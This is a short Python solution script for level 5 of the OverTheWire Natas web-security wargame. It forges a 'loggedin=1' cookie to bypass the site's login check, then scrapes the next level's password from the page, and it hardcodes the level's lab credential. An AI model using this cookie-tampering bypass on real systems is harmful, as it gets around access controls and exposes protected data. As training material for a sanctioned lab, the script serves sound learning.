#!/usr/bin/python3

import requests
import re

level = 5
username = 'natas%s' % level
password = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'
url = 'http://%s.natas.labs.overthewire.org/' % username

# Here we get that we are not logged in and checking the cookies we get 'loggedin=0'.
# Try setting loggedin=1 now...
cookies = {'loggedin': '1'}
response = requests.get(url, auth=(username, password), cookies=cookies)

# That should do it - now print the password
password = re.findall('The password for natas%s is (.*)</div>' % str(level+1), response.text)[0]
print(password)

